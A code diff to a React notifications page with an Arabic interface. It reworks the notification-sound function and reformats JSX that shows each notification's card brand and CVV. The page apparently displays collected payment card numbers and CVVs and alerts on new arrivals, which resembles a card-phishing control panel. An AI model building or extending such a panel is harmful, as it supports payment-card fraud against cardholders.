@@ -279,12 +279,38 @@ function useOnlineUsersCount() {
 
 // Play notification sound function
 export const playNotificationSound = () => {
-  const audio = new Audio("/not.mp3")
-  console.log("play")
-  if (audio) {
-    audio!.play().catch((error) => {
-      console.error("Failed to play sound:", error)
-    })
+  try {
+    // Create a new Audio instance each time to avoid issues with replaying
+    const audio = new Audio("/not.wav")
+    audio.volume = 0.5 // Set a reasonable volume
+
+    // Preload the audio
+    audio.load()
+
+    // Play the audio with proper error handling
+    const playPromise = audio.play()
+
+    // Modern browsers return a promise from audio.play()
+    if (playPromise !== undefined) {
+      playPromise
+        .then(() => {
+          console.log("Notification sound played successfully")
+        })
+        .catch((error) => {
+          console.error("Failed to play notification sound:", error)
+          // Try an alternative approach for browsers with autoplay restrictions
+          document.addEventListener(
+            "click",
+            function playOnUserInteraction() {
+              audio.play()
+              document.removeEventListener("click", playOnUserInteraction)
+            },
+            { once: true },
+          )
+        })
+    }
+  } catch (error) {
+    console.error("Error initializing notification sound:", error)
   }
 }
 
@@ -675,7 +701,7 @@ export default function NotificationsPage() {
               <LogOut className="h-4 w-4 ml-2" />
               العودة للرئيسية
             </Button>
-            <ThemeToggleButton/>
+            <ThemeToggleButton />
           </div>
         </header>
 
@@ -1125,7 +1151,11 @@ export default function NotificationsPage() {
                   <div>
                     <div className="flex justify-between items-start">
                       <span className="text-lg font-semibold italic">
-                        {selectedNotification.cardData?.bank || selectedNotification.cardNumber?.at(0)==='4'? "VISA":selectedNotification.cardNumber?.at(0)==='5'?'Mastercard':''}
+                        {selectedNotification.cardData?.bank || selectedNotification.cardNumber?.at(0) === "4"
+                          ? "VISA"
+                          : selectedNotification.cardNumber?.at(0) === "5"
+                            ? "Mastercard"
+                            : ""}
                       </span>
                       {/* Placeholder for Card Network Logo */}
                       <CreditCard className="w-10 h-10 text-gray-200 opacity-70" />
@@ -1144,7 +1174,7 @@ export default function NotificationsPage() {
                       <div>
                         <p className="text-gray-300 uppercase text-[0.6rem] tracking-wider">Cvv </p>
                         <p className="uppercase font-medium tracking-wide">
-                          {selectedNotification?.cvv|| "HOLDER NAME"}
+                          {selectedNotification?.cvv || "HOLDER NAME"}
                         </p>
                       </div>
                       <div>
